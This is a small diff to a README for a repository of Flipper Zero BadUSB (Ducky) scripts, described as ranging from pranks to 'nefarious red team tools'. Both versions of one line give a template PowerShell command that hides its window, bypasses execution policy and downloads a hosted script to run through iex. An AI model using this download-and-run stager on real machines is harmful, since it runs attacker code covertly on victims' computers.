@@ -1,10 +1,10 @@
 # Downloadable-Ducky-Scripts-For-FlipperZero
 
-**These scripts download scripts to run from this repo -**
+**These scripts download and run from this repo -**
 
 https://github.com/beigeworm/assets/tree/main/Scripts
 
-they all use this command > `powershell -NoP -Ep Bypass -W H -C $variable='USER_INPUT_HERE'; irm HOSTED_SCRIPT_URL_HERE | iex`
+they all use this command > `STRING powershell -NoP -Ep Bypass -W H -C $variable='USER_INPUT_HERE'; irm HOSTED_SCRIPT_URL_HERE | iex`
 
 These scripts range from harmless pranks to nefarious red team tools. For educational purposes only! 
 
